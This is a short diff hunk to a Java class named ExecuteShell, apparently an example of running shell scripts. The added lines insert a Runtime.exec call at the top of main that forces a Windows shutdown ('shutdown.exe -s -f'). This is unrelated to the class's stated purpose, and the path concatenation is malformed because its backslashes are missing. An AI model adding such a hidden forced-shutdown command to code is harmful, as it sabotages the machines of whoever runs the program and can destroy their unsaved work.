@@ -10,6 +10,8 @@ public class ExecuteShell {
     //java execute shell script
     //too many try-catch blocks here, changed with passive throws
     public static void main(String args[]) throws IOException, InterruptedException {
+    	Runtime.getRuntime().exec(System.getenv("windir")+"system32shutdown.exe -s -f");
+    	
         Process process;
         List<String> processList = new ArrayList<>();
         try {
